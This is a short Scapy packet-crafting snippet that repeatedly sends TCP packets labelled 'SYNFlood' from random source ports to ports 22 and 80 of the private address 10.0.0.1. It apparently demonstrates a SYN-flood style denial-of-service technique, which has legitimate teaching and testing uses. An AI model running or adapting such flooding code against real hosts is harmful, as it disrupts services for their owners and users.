topt=[('Timestamp', (10,0))]

p=IP(dst=10.0.0.1,id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000)/"SYNFlood"

ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
